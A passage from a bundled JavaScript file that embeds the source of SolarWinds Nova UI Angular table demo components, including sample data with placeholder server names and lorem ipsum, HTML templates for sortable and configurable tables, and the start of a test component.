"status_up",\n            location: "Brno",\n        },\n        {\n            position: 4,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 5,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 6,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 7,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 8,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 9,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Quis autem vel eum iure reprehenderit qui in ea voluptate.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 10,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 11,\n            item: "FOCUS-SVR-111111",\n            description:\n                "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.",\n            status: "status_inactive",\n            location: "Brno",\n        },\n        {\n            position: 12,\n            item: "Man-LT-2222222",\n            description: "Sed ut perspiciatis unde omnis iste natus error sit.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 13,\n            item: "FOCUS-SVR-333333",\n            description:\n                "Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 14,\n            item: "Man-LT-444444",\n            description:\n                "Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 15,\n            item: "Man-LT-555555",\n            description:\n                "Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 16,\n            item: "Man-LT-666666",\n            description:\n                "Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 17,\n            item: "Man-LT-777777",\n            description:\n                "Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 18,\n            item: "Man-LT-888888",\n            description:\n                "Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 19,\n            item: "Man-LT-999999",\n            description:\n                "Quis autem vel eum iure reprehenderit qui in ea voluptate.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 20,\n            item: "Man-LT-200000",\n            description:\n                "At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti.",\n            status: "status_up",\n            location: "Brno",\n        },\n    ];\n}\n'},59583:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" id="nui-demo-sortable-table">\n    <button\n        nui-button\n        type="button"\n        class="mb-2"\n        id="nui-demo-sortable-table-btn"\n        (click)="sortByName()"\n    >\n        Sort By Name ({{ nameSortedDesc ? "Ascending" : "Descending" }})\n    </button>\n\n    <div class="mb-3">(sortOrderChanged) output: {{ sortedColumn | json }}</div>\n\n    <table\n        nui-table\n        [dataSource]="dataSource"\n        [sortable]="true"\n        [sortedColumn]="sortedColumn"\n        #sortableTable\n        (sortOrderChanged)="sortData($event)"\n    >\n        <ng-container nuiColumnDef="position">\n            <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="name">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Name</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.name }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="features">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Features</th>\n            <td nui-cell *nuiCellDef="let element">\n                <nui-icon\n                    *ngFor="let icon of element.features"\n                    [icon]="icon"\n                    class="icon-margin"\n                ></nui-icon>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="asset">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Asset Class</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.asset }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.location }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Status</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.status }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="outages">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Outages</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.outages }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="checks">\n            <th\n                nui-header-cell\n                [isColumnSortingDisabled]="true"\n                *nuiHeaderCellDef\n                i18n\n            >\n                Checks\n            </th>\n            <td nui-cell *nuiCellDef="let element">\n                <ng-container *ngFor="let check of element.checks">\n                    <nui-icon [icon]="check.icon"></nui-icon>\n                    {{ check.num }}\n                </ng-container>\n            </td>\n        </ng-container>\n        <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n        <tr nui-row *nuiRowDef="let row; columns: displayedColumns"></tr>\n    </table>\n</div>\n'},12231:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { AfterViewInit, Component, OnDestroy, ViewChild } from "@angular/core";\nimport { Subscription } from "rxjs";\n\nimport {\n    ClientSideDataSource,\n    INovaFilteringOutputs,\n    ISortedItem,\n    SorterDirection,\n    TableComponent,\n} from "@nova-ui/bits";\n\ninterface IExampleTableModel {\n    position: number;\n    name: string;\n    features: any;\n    asset: string;\n    location: string;\n    status: string;\n    outages: number;\n    checks: any;\n}\n\n@Component({\n    selector: "nui-table-sorting-example",\n    templateUrl: "./table-sorting.example.component.html",\n    providers: [ClientSideDataSource],\n})\nexport class TableSortingExampleComponent implements AfterViewInit, OnDestroy {\n    public displayedColumns = [\n        "position",\n        "name",\n        "features",\n        "asset",\n        "location",\n        "status",\n        "outages",\n        "checks",\n    ];\n    public dataSource?: IExampleTableModel[] = getData();\n    public sortedColumn: ISortedItem = {\n        sortBy: "position",\n        direction: SorterDirection.ascending,\n    };\n    public nameSortedDesc = false;\n    @ViewChild("sortableTable")\n    sortableTable: TableComponent<IExampleTableModel>;\n    private outputsSubscription: Subscription;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<IExampleTableModel>\n    ) {\n        dataSourceService.setData(this.dataSource);\n    }\n\n    public sortData(sortedColumn: ISortedItem): void {\n        this.sortedColumn = sortedColumn;\n        this.dataSourceService.applyFilters();\n    }\n\n    public sortByName(): void {\n        this.nameSortedDesc = !this.nameSortedDesc;\n        this.sortedColumn = {\n            sortBy: "name",\n            direction: this.nameSortedDesc\n                ? SorterDirection.descending\n                : SorterDirection.ascending,\n        };\n    }\n\n    public ngAfterViewInit(): void {\n        this.dataSourceService.registerComponent(\n            this.sortableTable.getFilterComponents()\n        );\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.dataSource = data.repeat?.itemsSource;\n                }\n            );\n\n        this.dataSourceService.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Company secrets",\n            location: "Kyiv",\n            status: "Critical",\n            outages: 17,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 2,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Prague",\n            status: "Down",\n            outages: 71,\n            checks: [\n                {\n                    icon: "status_critical",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 3,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "London",\n            status: "Inactive",\n            outages: 56,\n            checks: [\n                {\n                    icon: "status_down",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 4,\n            name: "ABN-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Patents",\n            location: "NY",\n            status: "Warning",\n            outages: 48,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 5,\n            name: "KLM-LFT-JAD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Blueprints",\n            location: "Austin",\n            status: "Active",\n            outages: 81,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n    ];\n}\n'},42273:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport interface ITestTableModel {\n    position: number;\n    name: string;\n    features: any;\n    asset: string;\n    location: string;\n    status: string;\n    outages: number;\n    checks: any;\n}\n\nexport const ELEMENT_DATA: ITestTableModel[] = [\n    {\n        position: 1,\n        name: "FOCUS-SVR-02258",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_inactive",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_up",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 2,\n        name: "Man-LT-JYJ4AD5",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_up",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_critical",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 3,\n        name: "FOCUS-SVR-02258",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_up",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_down",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 4,\n        name: "Man-LT-JYJ4AD5",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_inactive",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_up",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 5,\n        name: "Man-LT-JYJ4AD5",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_inactive",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_up",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 6,\n        name: "Man-LT-JYJ4AD5",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_up",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_mixed",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 7,\n        name: "Man-LT-JYJ4AD5",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_up",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_external",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 8,\n        name: "Man-LT-JYJ4AD5",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_up",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_inactive",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 9,\n        name: "Man-LT-JYJ4AD5",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_inactive",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_up",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 10,\n        name: "Man-LT-JYJ4AD5",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_inactive",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_up",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 11,\n        name: "Man-LT-JYJ4AD5",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_inactive",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_external",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 12,\n        name: "Man-LT-JYJ4AD5",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_up",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_up",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 13,\n        name: "Man-LT-JYJ4AD5",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_inactive",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_external",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 14,\n        name: "Man-LT-JYJ4AD5",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_up",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_inactive",\n                num: 25,\n            },\n        ],\n    },\n    {\n        position: 15,\n        name: "Man-LT-JYJ4AD5",\n        features: [\n            "remote-access-vpn-tunnel",\n            "tools",\n            "database",\n            "orion-ape-backup",\n            "patch-manager01",\n        ],\n        asset: "Workstation",\n        location: "Brno",\n        status: "status_up",\n        outages: Math.floor(Math.random() * 100),\n        checks: [\n            {\n                icon: "status_external",\n                num: 25,\n            },\n        ],\n    },\n];\n'},29163:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__options">\n    <section class="demo-options-section">\n        <button\n            type="button"\n            id="nui-demo-table-test-columns-table-parameters-btn"\n            nui-button\n            icon="edit"\n            (click)="open(parameters)"\n            i18n\n        >\n            Table parameters\n        </button>\n\n        <ng-template #parameters let-close="close" let-dismiss="dismiss">\n            <nui-dialog-header\n                i18n-title\n                title="Table parameters"\n                (closed)="close()"\n            ></nui-dialog-header>\n            <form [formGroup]="optionsForm">\n                <div class="form-group">\n                    <div class="dialog-body">\n                        <nui-checkbox formControlName="reorderable">\n                            Reorderable\n                        </nui-checkbox>\n\n                        <nui-checkbox formControlName="resizable">\n                            Resizable\n                        </nui-checkbox>\n\n                        <nui-checkbox formControlName="sortable">\n                            Sortable\n                        </nui-checkbox>\n\n                        <h5 i18n>Change cells content alignment</h5>\n                        <nui-select\n                            [itemsSource]="alignmentsArray"\n                            id="nui-demo-table-test-columns-alignment-select"\n                            placeholder="Select alignment"\n                            formControlName="alignment"\n                        >\n                        </nui-select>\n\n                        <h5 i18n>Change rows density</h5>\n                        <nui-select\n                            [itemsSource]="densitiesArray"\n                            id="nui-demo-table-test-columns-density-select"\n                            placeholder="Select row density"\n                            formControlName="density"\n                        >\n                        </nui-select>\n\n                        <h5 i18n>Change columns width</h5>\n                        <nui-textbox-number\n                            placeholder="Set columns width"\n                            id="nui-demo-table-test-column-width"\n                            formControlName="positionWidth"\n                        >\n                        </nui-textbox-number>\n                    </div>\n\n                    <nui-dialog-footer>\n                        <button\n                            nui-button\n                            id="nui-demo-table-test-columns-dialog-close-btn"\n                            type="button"\n                            displayStyle="primary"\n                            (click)="close(\'Cancel\')"\n                            i18n\n                        >\n                            Close\n                        </button>\n                    </nui-dialog-footer>\n                </div>\n            </form>\n        </ng-template>\n    </section>\n\n    <section class="demo-options-section">\n        <button\n            type="button"\n            id="nui-demo-table-test-columns-add-remove-edit-btn"\n            nui-button\n            icon="edit"\n            (click)="open(content)"\n            i18n\n        >\n            Edit columns\n        </button>\n\n        <br />\n        <button\n            type="button"\n            id="nui-demo-table-test-limit-search-btn"\n            nui-button\n            (click)="limitSearch()"\n            i18n\n        >\n            Toggle search by outages\n        </button>\n\n        <br />\n        <button\n            nui-button\n            type="button"\n            id="nui-demo-table-test-disable-column-sorting-btn"\n            (click)="disableSorting()"\n            i18n\n        >\n            Disable features column for sorting\n        </button>\n\n        <ng-template #content let-close="close" let-dismiss="dismiss">\n            <nui-dialog-header\n                i18n-title\n                title="Edit columns"\n                (closed)="close()"\n            ></nui-dialog-header>\n            <form [formGroup]="myForm">\n                <div class="form-group">\n                    <div class="dialog-body">\n                        <nui-message\n                            [allowDismiss]="true"\n                            type="critical"\n                            *ngIf="\n                                !myForm.controls[\'checkboxGroup\'].valid &&\n                                myForm.controls[\'checkboxGroup\'].touched\n                            "\n                        >\n                            <b i18n>Select minimum 3 checkboxes!</b>\n                        </nui-message>\n\n                        <h5 i18n>Available columns</h5>\n                        <nui-checkbox-group\n                            id="nui-demo-table-test-add-remove-checkboxes"\n                            [values]="displayedColumnsCopy"\n                            (valuesChange)="columnsChanged($event)"\n                            formControlName="checkboxGroup"\n                            required\n                        >\n                            <nui-checkbox\n                                *ngFor="let availableColumn of availableColumns"\n                                [value]="availableColumn"\n                                class="text-capitalize"\n                                [checked]="isChecked(availableColumn)"\n                            >\n                                {{ availableColumn }}\n                            </nui-checkbox>\n                        </nui-checkbox-group>\n\n                        <nui-divider></nui-divider>\n\n                        <h5 i18n>Create new column</h5>\n                        <div class="d-flex flex-row">\n                            <div class="col">\n                                <nui-textbox\n                                    id="nui-demo-table-test-add-remove-new-column-textbox"\n                                    [value]="newColumn"\n                                    (textChange)="updateNewColumnValue($event)"\n                                    i18n-placeholder\n                                    placeholder="Enter new column title"\n                                >\n                                </nui-textbox>\n                            </div>\n                            <div class="col col-auto">\n                                <button\n                                    nui-button\n                                    type="button"\n                                    displayStyle="default"\n                                    id="nui-demo-table-test-add-remove-new-column-btn"\n                                    class="ml-3"\n                                    (click)="addNewColumn()"\n                                    i18n\n                                >\n                                    Add new column\n                                </button>\n                            </div>\n                        </div>\n                    </div>\n                    <nui-dialog-footer>\n                        <button\n                            nui-button\n                            type="button"\n                            (click)="close(\'Cancel\')"\n                            i18n\n                        >\n                            Cancel\n                        </button>\n                        <button\n                            nui-button\n                            type="button"\n                            id="nui-demo-table-test-columns-add-remove-submit-btn"\n                            displayStyle="primary"\n                            (click)="updateColumns(); close(\'Action\')"\n                            [disabled]="\n                                myForm.controls[\'checkboxGroup\'].invalid\n                            "\n                            i18n\n                        >\n                            Update columns\n                        </button>\n                    </nui-dialog-footer>\n                </div>\n            </form>\n        </ng-template>\n    </section>\n\n    <div class="nui-searchable-table__search">\n        <nui-search\n            id="nui-demo-table-test-search"\n            [value]="searchTerm"\n            (search)="onSearch($event)"\n            (cancel)="onSearchCancel()"\n            #filteringSearch\n        >\n        </nui-search>\n    </div>\n</div>\n\n<div class="nui-table__container" id="nui-test-table">\n    <table\n        nui-table\n        #testTable\n        [dataSource]="dataSource"\n        [sortable]="sortable"\n        #sortableTable\n        (sortOrderChanged)="sortData()"\n        #filteringTable\n        [resizable]="resizable"\n        [reorderable]="reorderable"\n        [selectionConfig]="selectionConfig"\n        [totalItems]="paginationTotal"\n        (columnsOrderChange)="toastColumns($event)"\n    >\n        <ng-container nuiColumnDef="position" [columnWidth]="positionWidth">\n            <th nui-header-cell *nuiHeaderCellDef i18n [alignment]="alignment">\n                No.\n            </th>\n            <td nui-cell *nuiCellDef="let element" [alignment]="alignment">\n                {{ element.position }}\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="name">\n            <th nui-header-cell *nuiHeaderCellDef i18n [alignment]="alignment">\n                Name\n            </th>\n            <td nui-cell *nuiCellDef="let element" [alignment]="alignment">\n                {{ element.name }}\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="features">\n            <th\n                nui-header-cell\n                [isColumnSortingDisabled]="isFeatureColumnDisabled"\n                *nuiHeaderCellDef\n                i18n\n                [alignment]="alignment"\n            >\n                Features\n            </th>\n            <td nui-cell *nuiCellDef="let element" [alignment]="alignment">\n                <nui-icon\n                    *ngFor="let icon of element.features"\n                    [icon]="icon"\n                    class="icon-margin"\n                >\n                </nui-icon>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="asset">\n            <th nui-header-cell *nuiHeaderCellDef i18n [alignment]="alignment">\n                Asset Class\n            </th>\n            <td nui-cell *nuiCellDef="let element" [alignment]="alignment">\n                {{ element.asset }}\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n [alignment]="alignment">\n                Location\n            </th>\n            <td nui-cell *nuiCellDef="let element" [alignment]="alignment">\n                {{ element.location }}\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status" type="icon">\n            <th nui-header-cell *nuiHeaderCellDef i18n>\n                <nui-icon icon="enable"></nui-icon>\n            </th>\n            <td nui-cell *nuiCellDef="let element">\n                <nui-icon [icon]="element.status"></nui-icon>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="outages">\n            <th nui-header-cell *nuiHeaderCellDef i18n [alignment]="alignment">\n                Outages\n            </th>\n            <td nui-cell *nuiCellDef="let element" [alignment]="alignment">\n                {{ element.outages }}\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="checks">\n            <th nui-header-cell *nuiHeaderCellDef i18n [alignment]="alignment">\n                Checks\n            </th>\n            <td nui-cell *nuiCellDef="let element" [alignment]="alignment">\n                <ng-container *ngFor="let check of element.checks">\n                    <nui-icon [icon]="check.icon"></nui-icon>\n                    {{ check.num }}\n                </ng-container>\n            </td>\n        </ng-container>\n\n        <tr\n            nui-header-row\n            *nuiHeaderRowDef="displayedColumns; sticky: true"\n        ></tr>\n        <tr\n            nui-row\n            *nuiRowDef="let row; columns: displayedColumns"\n            [density]="density"\n            [rowObject]="row"\n        ></tr>\n    </table>\n</div>\n\n<nui-paginator\n    id="nui-demo-table-test-paginator"\n    [page]="1"\n    [pageSize]="10"\n    [total]="paginationTotal"\n    activeClass="active"\n    disabledClass="disabled"\n    showPrevNext="true"\n    (pagerAction)="changePagination()"\n    #filteringPaginator\n>\n</nui-paginator>\n'},26483:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    ApplicationRef,\n    ChangeDetectorRef,\n    Component,\n    Inject,\n    OnDestroy,\n    OnInit,\n    TemplateRef,\n    ViewChild,\n    ViewContainerRef,\n} from "@angular/core";\nimport { NonNullableFormBuilder, Validators } from "@angular/forms";\nimport { Subscription } from "rxjs";\nimport { debounceTime } from "rxjs/operators";\n\nimport {\n    ClientSideDataSource,\n    DialogService,\n    INovaFilteringOutputs,\n    IToastService,\n    PaginatorComponent,\n    RowHeightOptions,\n    SearchComponent,\n    TableAlignmentOptions,\n    TableComponent,\n    TableSelectionConfig,\n    TableSelectionMode,\n    ToastService,\n} from "@nova-ui/bits";\n\nimport { ELEMENT_DATA, ITestTableModel } from "./table-test-data-source";\nimport { TableStateHandlerService } from "../../../../../../src/lib/table/table-state-handler.service";\n\n@Component({\n    selector: "nui-table-test",\n    providers: [ClientSideDataSource, TableStateHandlerService],\n    templateUrl: "./table-test.component.html",\n})\nexport class TableTestComponent implements AfterViewInit, OnDestroy, OnInit {\n    public dataSource?: ITestTableModel[] = ELEMENT_DATA;\n    public newColumn: string;\n    public availableColumns = [\n        "position",\n        "name",\n        "features",\n        "asset",\n        "location",\n        "status",\n        "outages",\n        "checks",\n    ];\n    public displayedColumns = this.availableColumns.slice();\n    // full copy of displayed columns added to update columns only when updateTable() is called\n    public displayedColumnsCopy = this.displayedColumns.slice();\n    public myForm;\n    public alignmentsArray: 